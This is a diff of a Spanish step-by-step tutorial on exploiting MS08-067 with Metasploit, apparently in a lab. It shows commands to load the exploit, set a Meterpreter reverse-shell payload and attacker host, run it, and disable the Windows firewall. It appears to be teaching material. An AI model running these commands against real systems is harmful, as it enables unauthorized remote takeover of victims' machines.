@@ -24,30 +24,30 @@ Esta guía explica paso a paso cómo explotar la vulnerabilidad MS08-067 (netapi
 
 ## 🧪 **Paso a paso: Explotación con Metasploit**
 
-**1. Obtener la IP de la víctima** (en la máquina Windows)
+**🔹 1. Obtener la IP de la víctima** (en la máquina Windows)
 <pre>ipconfig.</pre>
 
-**2. Iniciar Metasploit** (en Kali)
+**🔹 2. Iniciar Metasploit** (en Kali)
 <pre>msfconsole</pre>
 
-**3. Buscar el exploit**
+**🔹 3. Buscar el exploit**
 <pre>search ms08_067</pre>
 
-**4. Cargar el exploit**
+**🔹 4. Cargar el exploit**
 <pre>use exploit/windows/smb/ms08_067_netapi</pre>
 
-**5. Ver opciones**
+**🔹 5. Ver opciones**
 <pre>show options</pre>
 
-**6. Configurar opciones**
+**🔹 6. Configurar opciones**
 <pre>set RHOST [IP víctima]</pre>
 <pre>set LHOST [IP atacante]</pre>
 <pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
 
-**7. Verificar configuración**
+**🔹 7. Verificar configuración**
 <pre>show options</pre>
 
-**8. Ejecutar exploit**
+**🔹 8. Ejecutar exploit**
 <pre>exploit</pre>
 
 **Resultado esperado**
@@ -76,3 +76,7 @@ Se abre una shell Meterpreter si tuvo éxito.
 
 - Desactivar firewall de Windows:
 <pre> netsh firewall set opmode disable </pre>
+
+## 📚 **Recursos**
+- [Exploit-DB: MS08-067](https://www.exploit-db.com/exploits/7104)
+- [Rapid7 Metasploit Docs](https://www.rapid7.com/blog/post/2014/02/03/new-ms08-067/)
